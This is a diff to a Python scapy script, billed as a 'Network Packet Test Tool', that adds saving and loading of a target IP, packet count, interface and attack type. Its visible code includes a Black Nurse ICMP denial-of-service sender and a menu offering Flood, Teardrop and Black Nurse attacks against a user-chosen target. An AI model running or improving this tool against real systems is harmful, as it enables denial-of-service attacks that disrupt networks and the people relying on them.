@@ -4,12 +4,14 @@ import os
 import sys
 from scapy.all import IP, ICMP, send, conf, get_if_list, get_if_addr, sr1
 import warnings
+import json
 
 # Silence warnings
 warnings.filterwarnings("ignore", category=SyntaxWarning)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 conf.verb = 0
 
+CHOICE_FILE = "choices.txt"
 PAYLOAD = "ping"
 
 import ctypes
@@ -78,37 +80,76 @@ def send_blacknurse(dst_ip, src_ip, iface, count):
     pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=3, code=3)
     send(pkt * count, iface=iface)
 
+def save_choices(choices):
+    with open(CHOICE_FILE, 'w') as f:
+        json.dump(choices, f)
+    print(f"[+] Choices saved to {CHOICE_FILE}")
+
+def load_choices():
+    if not os.path.exists(CHOICE_FILE):
+        print(f"[-] No saved choices found.")
+        return None
+    with open(CHOICE_FILE, 'r') as f:
+        try:
+            choices = json.load(f)
+            print(f"[+] Loaded saved choices from {CHOICE_FILE}")
+            return choices
+        except json.JSONDecodeError:
+            print(f"[!] Error reading saved choices.")
+            return None
+
 def main():
     print("=== Network Packet Test Tool ===")
 
-    # Get and verify reachable target IP
-    while True:
-        dst_ip = get_user_input("Target IP address: ")
-        if is_ip_reachable(dst_ip):
-            break
-        else:
+    load_prev = get_user_input("Do you want to load saved choices? (y/n): ", valid_options=["y", "n"])
+    choices = {}
+
+    if load_prev == "y":
+        choices = load_choices()
+        if not choices:
+            print("[-] Failed to load saved configuration. Switching to manual input.")
+            load_prev = "n"
+
+    if load_prev == "n":
+        while True:
+            dst_ip = get_user_input("Target IP address: ")
+            if is_ip_reachable(dst_ip):
+                break
             retry = get_user_input("Do you want to try a different IP? (y/n): ", valid_options=["y", "n"])
             if retry == "n":
                 print("[-] Exiting.")
                 sys.exit(1)
 
-    # Number of messages
-    n_msg = int(get_user_input("Messages to send: "))
+        n_msg = int(get_user_input("Messages to send: "))
+        active_ifaces = list_active_interfaces()
+        if not active_ifaces:
+            print("[-] No active interfaces found.")
+            sys.exit(1)
+        iface = get_user_input("Interface to use (choose from above): ", valid_options=active_ifaces)
+        print("\nSelect attack type:")
+        print("1) Flood\n2) Teardrop\n3) Black Nurse")
+        attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])
 
-    # List and choose interface
-    active_ifaces = list_active_interfaces()
-    if not active_ifaces:
-        print("[-] No active interfaces found with valid IP addresses.")
-        sys.exit(1)
-    iface = get_user_input(f"Interface to use (choose from above): ", valid_options=active_ifaces)
+        local_ip = get_if_addr(iface)
 
+        choices = {
+            "dst_ip": dst_ip,
+            "n_msg": n_msg,
+            "iface": iface,
+            "local_ip": local_ip,
+            "attack_type": attack_type
+        }
+
+        save = get_user_input("Do you want to save these choices for next time? (y/n): ", valid_options=["y", "n"])
+        if save == "y":
+            save_choices(choices)
+
+    # Use loaded or freshly gathered choices
+    dst_ip = choices["dst_ip"]
+    n_msg = int(choices["n_msg"])
+    iface = choices["iface"]
     local_ip = get_if_addr(iface)
-    print(f"\n[+] Using local IP {local_ip} as source IP for all packets")
-
-    # Choose attack type
-    print("\nSelect attack type:")
-    print("1) Flood\n2) Teardrop\n3) Black Nurse")
-    attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])
+    attack_type = choices["attack_type"]
 
     print(f"\n[+] Sending {n_msg} packets from {local_ip} to {dst_ip} on interface {iface}...\n")
 
